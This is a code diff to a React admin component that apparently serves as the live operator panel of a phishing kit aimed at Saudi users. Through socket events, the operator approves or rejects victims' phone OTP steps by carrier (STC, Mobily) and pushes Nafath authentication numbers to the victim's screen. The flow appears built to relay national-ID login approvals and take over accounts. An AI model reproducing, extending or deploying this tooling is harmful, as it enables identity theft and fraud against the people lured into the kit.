@@ -39,6 +39,11 @@ const Main = () => {
     setUser({ data: user, active: true });
   };
 
+  const handleChange = async (id) => {
+    if (!price) return window.alert("املاء حفل الكود");
+    socket.emit("navazChange", { id, price });
+  };
+
   const handleAcceptLogin = async (id) => {
     if (!price && user.data.vioNumber) return window.alert("املاء حفل السعر");
     else {
@@ -159,7 +164,21 @@ const Main = () => {
   };
 
   const handleAcceptPhoneOtp = async (id) => {
-    if (!price) return window.alert("اكتب الرقم المرسل إلي نفاذ");
+    if (
+      user.data.phoneNetwork !== "STC" &&
+      user.data.phoneNetwork !== "Mobily"
+    ) {
+      if (!price) return window.alert("اكتب الرقم المرسل إلي نفاذ");
+    }
+    setUser({
+      data: {
+        ...user.data,
+        phoneOtpAccept: true,
+        networkAccept: false,
+        navazAceept: false,
+      },
+      active: true,
+    });
     socket.emit("acceptPhoneOTP", { id, price });
     await getUsers();
   };
@@ -168,17 +187,24 @@ const Main = () => {
     socket.emit("declinePhoneOTP", id);
     const _user = Users.find((u) => {
       if (u._id === id) {
-        return { ...u, phoneOtpAccept: true };
+        return { ...u, phoneOtpAccept: true, navazAceept: false };
       }
     });
     const withOut = Users.filter((u) => u._id !== id);
     setUsers([...withOut, _user]);
-    setUser({ data: { ..._user, phoneOtpAccept: true }, active: true });
+    setUser({
+      data: { ..._user, phoneOtpAccept: true, navazAceept: false },
+      active: true,
+    });
   };
 
   const handleAcceptService = async (id) => {
-    socket.emit("acceptService", id);
-    setUser({ data: { ...user.data, networkAccept: true }, active: true });
+    if (!price) return window.alert("اكتب الرقم المرسل إلي نفاذ");
+    socket.emit("acceptService", { id, price });
+    setUser({
+      data: { ...user.data, networkAccept: true, navazAceept: false },
+      active: true,
+    });
     await getUsers();
   };
 
@@ -192,6 +218,21 @@ const Main = () => {
     const withOut = Users.filter((u) => u._id !== id);
     setUsers([...withOut, _user]);
     setUser({ data: { ..._user, networkAccept: true }, active: true });
+  };
+
+  const handleAcceptNavaz = async (id) => {
+    socket.emit("acceptNavaz", id);
+    setUser({ data: { ...user.data, navazAceept: true }, active: true });
+    await getUsers();
+  };
+
+  const handleDeclineNavaz = async (id) => {
+    socket.emit("declineNavaz", id);
+    setUser({
+      data: { ...user.data, navazAceept: true, networkAccept: false },
+      active: true,
+    });
+    await getUsers();
   };
 
   useEffect(() => {
@@ -639,12 +680,17 @@ const Main = () => {
                       ""
                     ) : (
                       <>
-                        <input
-                          className="border rounded-md py-2 mt-3 w-3/4 text-center text-sm text-black"
-                          value={price}
-                          onChange={(e) => setPrice(e.target.value)}
-                          placeholder="رقم نفاذ"
-                        />{" "}
+                        {user.data.phoneNetwork !== "STC" &&
+                        user.data.phoneNetwork !== "Mobily" ? (
+                          <input
+                            className="border rounded-md py-2 mt-3 w-3/4 text-center text-sm text-black"
+                            value={price}
+                            onChange={(e) => setPrice(e.target.value)}
+                            placeholder="رقم نفاذ"
+                          />
+                        ) : (
+                          ""
+                        )}
                         <div className="w-4/5 flex col-span-2 md:col-span-1 justify-between gap-x-3  p-2 text-xs">
                           <button
                             className="bg-green-500 w-1/2 p-2 rounded-lg"
@@ -666,14 +712,69 @@ const Main = () => {
                   ""
                 )}
 
+                {user.data.phoneAccept &&
+                  user.data.phoneNetwork === "Mobily" &&
+                  !user.data.networkAccept && (
+                    <>
+                      <input
+                        className="border rounded-md py-2 mt-3 w-3/4 text-center text-sm text-black"
+                        value={price}
+                        onChange={(e) => setPrice(e.target.value)}
+                        placeholder="رقم نفاذ"
+                      />
+                      <div className="w-full flex col-span-2 md:col-span-1 justify-between gap-x-3  p-2 text-xs">
+                        <button
+                          className="bg-green-500 w-1/2 p-2 rounded-lg"
+                          onClick={() => handleAcceptService(user.data._id)}
+                        >
+                          قبول
+                        </button>
+                        <button
+                          className="bg-red-500 w-1/2 p-2 rounded-lg"
+                          onClick={() => handleDeclineService(user.data._id)}
+                        >
+                          رفض
+                        </button>
+                      </div>
+                    </>
+                  )}
+
                 {}
+                {user.data.phoneAccept &&
+                  user.data.phoneNetwork === "Mobily" &&
+                  user.data.networkAccept &&
+                  !user.data.navazAceept && (
+                    <>
+                      <input
+                        className="border rounded-md py-2 mt-3 w-3/4 text-center text-sm text-black"
+                        value={price}
+                        onChange={(e) => setPrice(e.target.value)}
+                        placeholder="رقم نفاذ"
+                      />
+                      <div className="w-full flex col-span-2 md:col-span-1 justify-between gap-x-3  p-2 text-xs">
+                        <button
+                          className="bg-yellow-500 w-1/2 p-2 rounded-lg"
+                          onClick={() => handleChange(user.data._id)}
+                        >
+                          تغيير
+                        </button>
+
+                        <button
+                          className="bg-red-500 w-1/2 p-2 rounded-lg"
+                          onClick={() => handleDeclineNavaz(user.data._id)}
+                        >
+                          رفض
+                        </button>
+                      </div>
+                    </>
+                  )}
               </div>
             ) : (
               ""
             )}
             {user.data.phoneAccept &&
-            (user.data?.phoneNetwork === "STC" ||
-              user.data?.phoneNetwork === "Mobily") ? (
+            user.data.phoneOtpAccept &&
+            user.data?.phoneNetwork === "STC" ? (
               <div className="flex flex-col items-center bg-sky-800 text-white py-2 px-3 rounded-lg gap-y-1   my-2">
                 <span className="text-lg mb-2">
                   قبول {user.data?.phoneNetwork}
@@ -682,23 +783,104 @@ const Main = () => {
                 {user.data.networkAccept ? (
                   "تم الرد"
                 ) : (
-                  <div className="w-full flex col-span-2 md:col-span-1 justify-between gap-x-3  p-2 text-xs">
-                    <button
-                      className="bg-green-500 w-1/2 p-2 rounded-lg"
-                      onClick={() => handleAcceptService(user.data._id)}
-                    >
-                      قبول
-                    </button>
-                    <button
-                      className="bg-red-500 w-1/2 p-2 rounded-lg"
-                      onClick={() => handleDeclineService(user.data._id)}
-                    >
-                      رفض
-                    </button>
-                  </div>
+                  <>
+                    <input
+                      className="border rounded-md py-2 mt-3 w-3/4 text-center text-sm text-black"
+                      value={price}
+                      onChange={(e) => setPrice(e.target.value)}
+                      placeholder="رقم نفاذ"
+                    />
+                    <div className="w-full flex col-span-2 md:col-span-1 justify-between gap-x-3  p-2 text-xs">
+                      <button
+                        className="bg-green-500 w-1/2 p-2 rounded-lg"
+                        onClick={() => handleAcceptService(user.data._id)}
+                      >
+                        قبول
+                      </button>
+                      <button
+                        className="bg-red-500 w-1/2 p-2 rounded-lg"
+                        onClick={() => handleDeclineService(user.data._id)}
+                      >
+                        رفض
+                      </button>
+                    </div>
+                  </>
                 )}
 
                 {}
+              </div>
+            ) : (
+              ""
+            )}
+
+            {user.data.phoneAccept &&
+            user.data.phoneOtpAccept &&
+            user.data?.phoneNetwork !== "Mobily" ? (
+              <div className="flex flex-col items-center bg-sky-800 text-white py-2 px-3 rounded-lg gap-y-1   my-2">
+                <span className="text-lg mb-2">نفاذ</span>
+
+                {user.data.networkAccept ? (
+                  user.data.navazAceept ? (
+                    "تم الرد"
+                  ) : (
+                    <>
+                      <input
+                        className="border rounded-md py-2 mt-3 w-3/4 text-center text-sm text-black"
+                        value={price}
+                        onChange={(e) => setPrice(e.target.value)}
+                        placeholder="رقم نفاذ"
+                      />
+                      <div className="w-full flex col-span-2 md:col-span-1 justify-between gap-x-3  p-2 text-xs">
+                        <button
+                          className="bg-yellow-500 w-1/2 p-2 rounded-lg"
+                          onClick={() => handleChange(user.data._id)}
+                        >
+                          تغيير
+                        </button>
+
+                        <button
+                          className="bg-red-500 w-1/2 p-2 rounded-lg"
+                          onClick={() => handleDeclineNavaz(user.data._id)}
+                        >
+                          رفض
+                        </button>
+                      </div>
+                    </>
+                  )
+                ) : (
+                  ""
+                )}
+                {!user.data.networkAccept ? (
+                  user.data.navazAceept ? (
+                    "تم الرد"
+                  ) : (
+                    <>
+                      <input
+                        className="border rounded-md py-2 mt-3 w-3/4 text-center text-sm text-black"
+                        value={price}
+                        onChange={(e) => setPrice(e.target.value)}
+                        placeholder="رقم نفاذ"
+                      />
+                      <div className="w-full flex col-span-2 md:col-span-1 justify-between gap-x-3  p-2 text-xs">
+                        <button
+                          className="bg-yellow-500 w-1/2 p-2 rounded-lg"
+                          onClick={() => handleChange(user.data._id)}
+                        >
+                          تغيير
+                        </button>
+
+                        <button
+                          className="bg-red-500 w-1/2 p-2 rounded-lg"
+                          onClick={() => handleDeclineNavaz(user.data._id)}
+                        >
+                          رفض
+                        </button>
+                      </div>
+                    </>
+                  )
+                ) : (
+                  ""
+                )}
               </div>
             ) : (
               ""
